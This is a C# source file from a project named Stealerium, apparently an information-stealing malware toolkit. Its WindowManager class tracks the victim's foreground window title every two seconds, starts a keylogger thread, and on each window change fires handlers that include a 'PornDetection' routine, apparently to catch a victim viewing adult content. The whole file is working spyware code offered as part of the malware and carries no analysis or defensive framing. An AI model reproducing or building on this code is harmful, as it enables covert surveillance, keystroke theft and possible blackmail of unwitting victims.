using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;
using Stealerium.Modules.Keylogger;

namespace Stealerium.Modules
{
    internal sealed class WindowManager
    {
        public static string ActiveWindow;
        public static Thread MainThread = new Thread(Run);

        // List with functions to call when active window is changed
        private static readonly List<Action> Functions = new List<Action>
        {
            EventManager.Action,
            PornDetection.Action
        };

        [DllImport("user32.dll")]
        public static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll", SetLastError = true)]
        private static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);

        // Get active window
        private static string GetActiveWindowTitle()
        {
            try
            {
                var hwnd = GetForegroundWindow();
                GetWindowThreadProcessId(hwnd, out var pid);
                var proc = Process.GetProcessById((int) pid);
                var title = proc.MainWindowTitle;
                if (string.IsNullOrWhiteSpace(title))
                    title = proc.ProcessName;
                return title;
            }
            catch (Exception)
            {
                return "Unknown";
            }
        }

        // Run title checker
        private static void Run()
        {
            Keylogger.Keylogger.MainThread.Start();
            var prevActiveWindow = "";
            while (true)
            {
                Thread.Sleep(2000);
                ActiveWindow = GetActiveWindowTitle();
                if (ActiveWindow == prevActiveWindow) continue;
                prevActiveWindow = ActiveWindow;
                foreach (var f in Functions)
                    f.Invoke();
            }
        }
    }
}